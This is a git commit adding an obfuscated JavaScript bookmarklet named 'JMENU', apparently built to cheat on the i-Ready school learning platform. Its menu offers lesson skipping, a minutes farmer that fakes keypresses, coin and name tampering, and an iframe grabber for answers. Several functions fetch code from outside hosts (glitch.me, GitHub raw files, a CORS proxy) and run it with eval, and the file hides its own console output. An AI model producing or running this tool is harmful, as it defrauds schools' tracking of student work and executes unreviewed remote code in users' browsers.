b9e24f06d81d9cac81677f3066b006b8370e6d1b
Revealing later! <83834491+FailedCoder23@users.noreply.github.com>
2023-02-27 17:47:22 -0500

    Create hack.js

---
+++ deobfuscated/hack.js
@@ -0,0 +1,248 @@
+javascript: (function (_0x52d700, _0x1a995e) {
+    function _0x12d1f7(_0x3f0f3e, _0xf344fa) {
+        return _0x2fc9(_0xf344fa - -0xc0, _0x3f0f3e);
+    }
+    var _0x33e622 = _0x52d700();
+    while (!![]) {
+        try {
+            var _0x5ee95e = -parseInt(_0x12d1f7(0x10, -0x9)) / 0x1 * (parseInt(_0x12d1f7(-0x4a, -0x3d)) / 0x2) + -parseInt(_0x12d1f7(-0x22, -0x3a)) / 0x3 * (parseInt(_0x12d1f7(-0x3d, -0x2d)) / 0x4) + -parseInt(_0x12d1f7(0x14, 0x12)) / 0x5 * (-parseInt(_0x12d1f7(-0x16, -0x10)) / 0x6) + -parseInt(_0x12d1f7(-0xd, 0x5)) / 0x7 * (parseInt(_0x12d1f7(0xf, 0x6)) / 0x8) + parseInt(_0x12d1f7(-0xf, -0x1c)) / 0x9 * (-parseInt(_0x12d1f7(-0x6c, -0x42)) / 0xa) + parseInt(_0x12d1f7(-0x11, -0x30)) / 0xb + parseInt(_0x12d1f7(0x23, -0x7)) / 0xc;
+            if (_0x5ee95e === _0x1a995e) break;
+            else _0x33e622['push'](_0x33e622['shift']());
+        } catch (_0x4e8e4b) {
+            _0x33e622['push'](_0x33e622['shift']());
+        }
+    }
+}(_0x29ff, 0x8d6df));
+_0x325803: if (document[_0x59821a(0x26b, 0x244)](_0x59821a(0x27d, 0x280))) document[_0x59821a(0x219, 0x244)]('jmenu')[_0x59821a(0x26c, 0x267)]();
+    else {
+        var block_to_insert, container_block;
+        block_to_insert = document[_0x59821a(0x285, 0x26d)](_0x59821a(0x27f, 0x27a)), block_to_insert['id'] = _0x59821a(0x281, 0x280), block_to_insert[_0x59821a(0x280, 0x275)] = '\x0a    <style>\x0a    .bu {\x0a    font-size:15px;\x0a  font-family:Arial;\x0a  width:140px;\x0a  height:40px;\x0a  border-width:5px;\x0a  color:rgba(205, 136, 226, 1);\x0a  border-color:rgba(3, 3, 3, 1);\x0a  font-weight:bold;\x0a  border-radius: 10px 20px;\x0a  text-shadow: 4px 6px 6px rgba(0, 0, 15, 1);\x0a  background:linear-gradient(rgba(178, 15, 236, 1), rgba(117, 20, 158, 1));\x0a  transition: all 1s;\x0a    }\x0a    .butext {\x0a    color:white;\x0a    font-size:15px;\x0a    }\x0a    .bu:hover {\x0a    width: 190px;\x0a    height: 50px;\x0a    border-radius: 50px 10px;\x0a    }\x0a    .title {\x0a    text-shadow: 3px 1px 5px rgba(207, 148, 255, 1);\x0a    color:#e9c7ff;\x0a    }\x0a    </style>\x0a    <img src=\"https://cdn.glitch.me/3ffb250d-17ed-4059-96f6-b63105c97664/logofade.gif\" width=\"40px\" height=\"30px\" style=\"position:absolute;right:10px;top:2px\"></img>\x0a    <h2 style=\"position:absolute;top:90%\">Toggle menu by clicking the bookmark.</h2>\x0a                                <h1 class=\"title\" style=\"text-align:center;\">JMENU</h1>\x0a                                <p>JMENU is made by J6co0b. Credits to wang and flowings for skipper.</p>    \x0a                                <p></p>\x0a                                <p id=\"pagez\" class=\"butext\">Here are the hacks.</p>\x0a                                <div id=\"thinz\">\x0a                        <button class=\"bu\" onclick=\"skip()\">Skipper</button>\x0a                                <p></p>\x0a                        <button class=\"bu\" onclick=\"skipper2()\">INSTANT SKIP</button>\x0a                                <p></p>\x0a                        <button class=\"bu\" onclick=\"minz()\">Mins Farmer</button>\x0a                                <p></p>\x0a                        <button class=\"bu\" onclick=\"calc()\">Calculator</button>\x0a                        <p></p>\x0a                        <button class=\"bu\" onclick =\"iframegrabber()\">iFrame Grabber</button>\x0a                        <p></p>\x0a                        <button class=\"bu\" onclick=\"page2()\">Page 2</button>\x0a                                \x0a                                </div>\x0a                                ', container_block = document[_0x59821a(0x28d, 0x276)](_0x59821a(0x227, 0x23b))[0x0], container_block[_0x59821a(0x2ba, 0x28f)](block_to_insert), jmenu[_0x59821a(0x242, 0x269)](_0x59821a(0x2b9, 0x294), _0x59821a(0x274, 0x290));
+    } dragElement(document[_0x59821a(0x240, 0x244)]('jmenu'));
+
+function dragElement(_0xe0b51c) {
+    var _0x410ad5 = (function () {
+            var _0x11094c = !![];
+            return function (_0x46f107, _0x183606) {
+                var _0x265113 = _0x11094c ? function () {
+                    function _0x461ce1(_0xdf5dac, _0x3e13d4) {
+                        return _0x2fc9(_0xdf5dac - -0x14f, _0x3e13d4);
+                    }
+                    if (_0x183606) {
+                        var _0x46a229 = _0x183606[_0x461ce1(-0x88, -0x96)](_0x46f107, arguments);
+                        return _0x183606 = null, _0x46a229;
+                    }
+                } : function () {};
+                return _0x11094c = ![], _0x265113;
+            };
+        }()),
+        _0x58b782 = _0x410ad5(this, function () {
+            function _0x15092e(_0x35d62c, _0x4897e8) {
+                return _0x2fc9(_0x35d62c - -0x26a, _0x4897e8);
+            }
+            return _0x58b782['toString']()['search'](_0x15092e(-0x1ac, -0x18b))[_0x15092e(-0x1be, -0x1b4)]()[_0x15092e(-0x1e0, -0x1dc)](_0x58b782)[_0x15092e(-0x1ca, -0x1d2)](_0x15092e(-0x1ac, -0x19e));
+        });
+    _0x58b782();
+    var _0x28dbdb = (function () {
+            var _0x3b326e = !![];
+            return function (_0x30529b, _0x4bbb99) {
+                var _0x58e02b = _0x3b326e ? function () {
+                    function _0x3ba321(_0x3d428a, _0x354bfa) {
+                        return _0x2fc9(_0x3d428a - 0x1ac, _0x354bfa);
+                    }
+                    if (_0x4bbb99) {
+                        var _0x58c42e = _0x4bbb99[_0x3ba321(0x273, 0x24b)](_0x30529b, arguments);
+                        return _0x4bbb99 = null, _0x58c42e;
+                    }
+                } : function () {};
+                return _0x3b326e = ![], _0x58e02b;
+            };
+        }()),
+        _0x40ca60 = _0x28dbdb(this, function () {
+            var _0x29a423 = function () {
+                    var _0x27a494;
+                    try {
+                        _0x27a494 = Function('return (function() ' + _0x5ca075(0x309, 0x325) + ');')();
+                    } catch (_0x3975a5) {
+                        _0x27a494 = window;
+                    }
+
+                    function _0x5ca075(_0x5f0906, _0x4dcc6b) {
+                        return _0x2fc9(_0x5f0906 - 0x247, _0x4dcc6b);
+                    }
+                    return _0x27a494;
+                },
+                _0x28ac96 = _0x29a423();
+
+            function _0x554cf9(_0x728887, _0x23e463) {
+                return _0x2fc9(_0x728887 - 0x53, _0x23e463);
+            }
+            var _0x507d4b = _0x28ac96[_0x554cf9(0xd2, 0xbf)] = _0x28ac96[_0x554cf9(0xd2, 0xcf)] || {},
+                _0xd8f535 = ['log', 'warn', _0x554cf9(0x116, 0x101), _0x554cf9(0x110, 0x134), 'exception', 'table', _0x554cf9(0xdb, 0x105)];
+            for (var _0x40e4e2 = 0x0; _0x40e4e2 < _0xd8f535['length']; _0x40e4e2++) {
+                var _0xcf39f3 = _0x28dbdb[_0x554cf9(0xdd, 0x106)][_0x554cf9(0xda, 0xca)][_0x554cf9(0xec, 0xe8)](_0x28dbdb),
+                    _0x23fc98 = _0xd8f535[_0x40e4e2],
+                    _0x5a77c2 = _0x507d4b[_0x23fc98] || _0xcf39f3;
+                _0xcf39f3[_0x554cf9(0xf6, 0x108)] = _0x28dbdb['bind'](_0x28dbdb), _0xcf39f3['toString'] = _0x5a77c2['toString'][_0x554cf9(0xec, 0xf7)](_0x5a77c2), _0x507d4b[_0x23fc98] = _0xcf39f3;
+            }
+        });
+
+    function _0x54fc20(_0x1ed6d8, _0x4c6585) {
+        return _0x59821a(_0x4c6585, _0x1ed6d8 - -0x47b);
+    }
+    _0x40ca60();
+    var _0x380e6a = 0x0,
+        _0x488cde = 0x0,
+        _0x1e2d78 = 0x0,
+        _0x7db4e7 = 0x0;
+    document[_0x54fc20(-0x237, -0x244)](_0xe0b51c['id'] + _0x54fc20(-0x239, -0x216)) ? document[_0x54fc20(-0x237, -0x22f)](_0xe0b51c['id'] + _0x54fc20(-0x239, -0x24a))[_0x54fc20(-0x21f, -0x224)] = _0x303544 : _0xe0b51c[_0x54fc20(-0x21f, -0x228)] = _0x303544;
+
+    function _0x303544(_0x4c4e9e) {
+        _0x4c4e9e = _0x4c4e9e || window[_0x22840a(0x233, 0x221)], _0x4c4e9e[_0x22840a(0x25c, 0x262)](), _0x1e2d78 = _0x4c4e9e[_0x22840a(0x236, 0x22b)];
+
+        function _0x22840a(_0x8031ed, _0x48330b) {
+            return _0x54fc20(_0x48330b - 0x44f, _0x8031ed);
+        }
+        _0x7db4e7 = _0x4c4e9e[_0x22840a(0x262, 0x24c)], document[_0x22840a(0x219, 0x210)] = _0x4fec2a, document[_0x22840a(0x261, 0x260)] = _0x4a65c6;
+    }
+
+    function _0x4a65c6(_0x510a3f) {
+        _0x510a3f = _0x510a3f || window['event'], _0x510a3f[_0x53ff10(0x1b5, 0x1c0)](), _0x380e6a = _0x1e2d78 - _0x510a3f[_0x53ff10(0x17e, 0x189)], _0x488cde = _0x7db4e7 - _0x510a3f[_0x53ff10(0x19f, 0x177)];
+
+        function _0x53ff10(_0x4015c8, _0x258a8e) {
+            return _0x54fc20(_0x4015c8 - 0x3a2, _0x258a8e);
+        }
+        _0x1e2d78 = _0x510a3f[_0x53ff10(0x17e, 0x19d)], _0x7db4e7 = _0x510a3f[_0x53ff10(0x19f, 0x1a6)], _0xe0b51c[_0x53ff10(0x1bb, 0x1af)][_0x53ff10(0x1a8, 0x17e)] = _0xe0b51c['offsetTop'] - _0x488cde + 'px', _0xe0b51c[_0x53ff10(0x1bb, 0x1a3)][_0x53ff10(0x17d, 0x19f)] = _0xe0b51c[_0x53ff10(0x195, 0x179)] - _0x380e6a + 'px';
+    }
+
+    function _0x4fec2a() {
+        document['onmouseup'] = null, document['onmousemove'] = null;
+    }
+}
+
+function skip() {
+    alert(_0x562a89(0x3d2, 0x3f4));
+    const _0x56fb72 = _0x562a89(0x3ea, 0x3f5);
+    document[_0x562a89(0x3fa, 0x3e9)][0xf][_0x562a89(0x410, 0x3eb)] == _0x56fb72 ? alert('lesson has already been loaded, refresh the page and run before going into your lesson') : fetch(_0x562a89(0x3f7, 0x3d6))[_0x562a89(0x3ba, 0x3de)](_0x30b463 => _0x30b463[_0x562a89(0x406, 0x3d9)]())['then'](_0x5bf90f => eval(_0x5bf90f));
+
+    function _0x562a89(_0x49e5e0, _0x381b3c) {
+        return _0x59821a(_0x49e5e0, _0x381b3c - 0x181);
+    }
+    window[_0x562a89(0x3f6, 0x3f0)] = function () {
+        function _0x40a361(_0x1632ee, _0x445c8e) {
+            return _0x562a89(_0x1632ee, _0x445c8e - -0x77);
+        }
+        p1(prompt(_0x40a361(0x36d, 0x36b)));
+    }, setInterval(function () {
+        function _0x47f98e(_0x3bffe4, _0x59cccb) {
+            return _0x562a89(_0x59cccb, _0x3bffe4 - -0x1d4);
+        }
+        try {
+            html5Iframe[_0x47f98e(0x1fc, 0x1d5)][_0x47f98e(0x228, 0x20c)][_0x47f98e(0x1f1, 0x1c6)](_0x47f98e(0x208, 0x22e)) != undefined && (html5Iframe[_0x47f98e(0x1fc, 0x1dc)][_0x47f98e(0x228, 0x253)][_0x47f98e(0x1f1, 0x1df)](_0x47f98e(0x208, 0x1f9))[_0x47f98e(0x229, 0x256)] = ![], html5Iframe['contentWindow'][_0x47f98e(0x228, 0x227)][_0x47f98e(0x1f1, 0x1eb)]('nav-forward')[_0x47f98e(0x237, 0x20a)] = yes);
+        } catch (_0x147b66) {}
+    }, 0xa);
+}
+
+function calc() {
+    function _0x1d2070(_0x5317e8, _0x45cf1b) {
+        return _0x59821a(_0x45cf1b, _0x5317e8 - -0x2ed);
+    }
+    eval('function _0x4b1424() {\n    _o = prompt(_t, _z);\n    function _0x4e152f(_0x2df00e, _0x4ad8db) {\n        return _0x2fc9(_0x2df00e - 273, _0x4ad8db);\n    }\n    if (_o != \'\' && _o != null && _o[\'toUpperCase\']() == _o[_0x4e152f(435, 405)]())\n        _z = eval(_o);\n}'), _t = _0x1d2070(-0x8e, -0x87), _z = '', calc();
+    while (_o != '' && _o != null && _o[_0x1d2070(-0x5a, -0x74)]() == _o['toLowerCase']()) calc();
+}
+
+function coins() {
+    function _0xc64443(_0x175f1f, _0x2e5691) {
+        return _0x59821a(_0x175f1f, _0x2e5691 - -0x3ec);
+    }
+    let _0x5ff37e = prompt('How many coins do you want?', _0xc64443(-0x1b0, -0x1a7));
+    document[_0xc64443(-0x15b, -0x16d)]('css-mloisn enj526p0')[0x0][_0xc64443(-0x17a, -0x177)] = _0x5ff37e, alert(_0xc64443(-0x165, -0x15b) + _0x5ff37e + _0xc64443(-0x17d, -0x15f));
+}
+
+function _0x29ff() {
+    var _0x49d46c = ['26693148dDJHUJ', 'div', 'document', 'disabled', 'error', '(((.+)+)+)+$', 'getElementsByClassName', 'jmenu', 'top', '{}.constructor(\"return this\")( )', 'info', 'dispatchEvent', '476SYvJZd', '16136BhwUcP', 'apply', 'https://api.allorigins.win/get?url=https://cdn.i-ready.com/instruction/student-dashboard/release-13.4.x/2/static/js/app-12.chunk.js', 'Type here.', 'onclick', 'replaceAll', 'onmousemove', ' now.', 'preventDefault', 'appendChild', '\x0aheight:500px;\x0awidth:200px;\x0abackground-color: #666666;\x0abackground-image: url(\'https://cdn.glitch.me/3ffb250d-17ed-4059-96f6-b63105c97664/mt3434.gif\');\x0abackground-position: center;\x0abackground-size: cover;\x0abackground-repeat: no-repeat;\x0acolor:white;\x0afloat:left;\x0afont-family:arial,\x0asans,\x0averdana;\x0afont-size:12px;\x0az-index:10000;\x0adisplay: inline-block;\x0aline-height:unset !important;\x0aline-height:1 !important;\x0aoverflow:visible;\x0aposition:fixed;\x0atop: 0;\x0apadding:2px 5px;\x0aborder-radius:50px 10px;\x0a', 'Your coins should be ', '335VJyQyC', 'toUpperCase', 'style', 'body', 'onmouseup', 'contents', '1092110fnlRUl', 'console', 'open', 'pagez', 'header', '2CiptfS', 'getElementById', '10,000', '36gWRBFJ', 'prototype', 'trace', 'html5Iframe', 'constructor', 'Lesson not detected.', 'css-1ii68kw e15psnz1', 'event', 'https://html-upload.glitch.me/v39/ir.js', 'contentWindow', '3742057CQvtfK', 'opened.', 'Mins farmer has been enabled.', '217204eoenzU', 'keydown', 'https://raw.githubusercontent.com/J6co0b/jmenu/main/files/app-21.chunk.js', 'left', 'clientX', 'text', 'bind', 'thinz', 'nav-forward', 'onmousedown', 'then', 'Instant skip has turned on.', 'Calculator - J6X', 'search', 'score?', 'toLowerCase', '__proto__', '81yAyhcu', 'https://sites.google.com/view/nyankat', 'function(){;var e=prompt(\"Score to skip\",Math.floor(Math.random()*(100-75)+75));if(e===\"null\") {return;};var _0x20d79b=_0x4157aa;return _0x3f6880[_0x20d79b(0x1eb)](_0x1a3616,new _0x34a99d(e));}', 'remove', 'scripts', 'setAttribute', 'src', 'function(){var _0x3e9a1f=_0x4157aa;return _0x3f6880[_0x3e9a1f(0x1eb)](_0x1a3616,new _0x2d93f4());}', 'toString', 'createElement', 'offsetLeft', 'yes', '65322VJxXlM', '\x0a  <p id=\"pagez\" class=\"butext\">Here are the hacks.</p>\x0a                        <button class=\"bu\" onclick=\"ireadygames()\">Iready games</button>\x0a                                <p></p>\x0a                        <button class=\"bu\" onclick =\"coins()\">Tamper coins</button>\x0a                        <p></p>\x0a                        <button class=\"bu\" onclick=\"ugames()\">Unblocked games</button>\x0a                        <p></p>\x0a                        <button class=\"bu\" onclick=\"namechanger()\">Name change</button>\x0a                        <p></p>\x0a                        <button class=\"bu\" onclick=\"page1()\">Page 1</button>\x0a  ', 'Lesson Iframe should be open. (YOU CAN GET ANSWERS FROM THE IFRAME)', 'Skip has been turned on. To skip a lesson, press the forward button next to the progress bar.', 'https://cdn.i-ready.com/instruction/student-dashboard/release-13.5.x/2/static/js/app-21.chunk.js', 'innerHTML', 'getElementsByTagName', '943083sVraed', 'clientY'];
+    _0x29ff = function () {
+        return _0x49d46c;
+    };
+    return _0x29ff();
+}
+
+function skipper2() {
+    function _0x178b23(_0x30efed, _0x537bb5) {
+        return _0x59821a(_0x30efed, _0x537bb5 - 0x7);
+    }
+    alert(_0x178b23(0x277, 0x265)), fetch(_0x178b23(0x2a5, 0x28f))['then'](_0x9b8cef => _0x9b8cef['json']())[_0x178b23(0x26b, 0x264)](_0x168b1a => _0x168b1a[_0x178b23(0x22c, 0x244)][_0x178b23(0x26b, 0x292)](_0x178b23(0x266, 0x272), _0x178b23(0x267, 0x26d)))['then'](_0x43ef02 => eval(_0x43ef02));
+}
+
+function iframegrabber() {
+    alert(_0x5e5c82(-0x2de, -0x2b3));
+
+    function _0x5e5c82(_0x70564f, _0x4914c0) {
+        return _0x59821a(_0x70564f, _0x4914c0 - -0x525);
+    }
+    open(window[_0x5e5c82(-0x2b4, -0x2dc)][_0x5e5c82(-0x299, -0x2bb)]);
+}
+
+function page2() {
+    function _0x6a602(_0x49f3f5, _0x4d5b78) {
+        return _0x59821a(_0x49f3f5, _0x4d5b78 - 0x218);
+    }
+    document['getElementById'](_0x6a602(0x472, 0x472))[_0x6a602(0x490, 0x47f)](), document[_0x6a602(0x463, 0x45c)](_0x6a602(0x442, 0x459))[_0x6a602(0x47d, 0x48d)] = _0x6a602(0x4b2, 0x489);
+}
+
+function _0x2fc9(_0x187a56, _0x1b1041) {
+    var _0x8a60a9 = _0x29ff();
+    return _0x2fc9 = function (_0x5381b5, _0x9a169) {
+        _0x5381b5 = _0x5381b5 - 0x7b;
+        var _0x5921fc = _0x8a60a9[_0x5381b5];
+        return _0x5921fc;
+    }, _0x2fc9(_0x187a56, _0x1b1041);
+}
+
+function _0x59821a(_0x24e90d, _0x5481e3) {
+    return _0x2fc9(_0x5481e3 - 0x1c0, _0x24e90d);
+}
+
+function page1() {
+    fetch('https://html-upload.glitch.me/v39/ir.js')[_0x56f977(-0x6f, -0x9c)](_0x5d20ad => _0x5d20ad[_0x56f977(-0x74, -0x4d)]())[_0x56f977(-0x6f, -0x68)](_0x4135dc => eval(_0x4135dc));
+
+    function _0x56f977(_0x5c773e, _0x4ed2b9) {
+        return _0x59821a(_0x4ed2b9, _0x5c773e - -0x2cc);
+    }
+    fetch(_0x56f977(-0x7e, -0x88))[_0x56f977(-0x6f, -0x6e)](_0x513622 => _0x513622[_0x56f977(-0x74, -0x81)]())[_0x56f977(-0x6f, -0x82)](_0x531ad6 => eval(_0x531ad6));
+}
+
+function ireadygames() {
+    function _0x2dbac3(_0x3259a5, _0x3c3189) {
+        return _0x59821a(_0x3c3189, _0x3259a5 - -0x398);
+    }
+    window[_0x2dbac3(-0x158, -0x184)]('https://docs.google.com/document/d/1Y5rPs6YQtTpp5HAiE6HTuesLxHHf53VTa41nvqF7uHk/');
+}
+
+function minz() {
+    function _0x4b7753(_0x466209, _0x371d89) {
+        return _0x59821a(_0x371d89, _0x466209 - -0x427);
+    }
+    window[_0x4b7753(-0x1de, -0x1df)] === undefined ? alert(_0x4b7753(-0x1dc, -0x1e6)) : (alert(_0x4b7753(-0x1d5, -0x1e0)), setInterval(function () {
+        function _0x42177a(_0x2f455b, _0x3a4df4) {
+            return _0x4b7753(_0x3a4df4 - -0x11f, _0x2f455b);
+        }
+        html5Iframe[_0x42177a(-0x2ff, -0x2f7)][_0x42177a(-0x2aa, -0x2c2)](new KeyboardEvent(_0x42177a(-0x2c5, -0x2f2), {
+            'key': 'a'
+        }));
+    }, 0x3e8));
+}
+
+function ugames() {
+    function _0x407051(_0x597fbb, _0x464ae0) {
+        return _0x59821a(_0x464ae0, _0x597fbb - -0x2ee);
+    }
+    window[_0x407051(-0xae, -0xad)](_0x407051(-0x89, -0x7e)), alert(_0x407051(-0x9d, -0xaf));
+}
+
+function namechanger() {
+    function _0x48b865(_0x4be554, _0x51ad1f) {
+        return _0x59821a(_0x4be554, _0x51ad1f - -0x559);
+    }
+    let _0x649aa2 = prompt('What name do you want?', _0x48b865(-0x2da, -0x2d0));
+    document['getElementsByClassName'](_0x48b865(-0x2e1, -0x30d))[0x0][_0x48b865(-0x2dc, -0x2e4)] = _0x649aa2;
+}
